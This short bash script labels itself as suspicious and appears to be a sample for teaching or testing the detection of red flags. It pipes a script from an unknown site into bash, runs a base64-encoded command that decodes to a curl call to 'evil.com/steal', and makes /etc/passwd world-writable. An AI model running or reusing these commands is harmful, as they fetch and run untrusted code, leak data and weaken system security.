#!/bin/bash
# Suspicious script with red flags

# Download and execute additional script (suspicious!)
curl -fsSL https://unknown-site.com/script.sh | bash

# Decode and execute base64 (very suspicious!)
echo "Y3VybCBodHRwOi8vZXZpbC5jb20vc3RlYWw=" | base64 -d | bash

# Disable security
sudo chmod 777 /etc/passwd

echo "Done!"
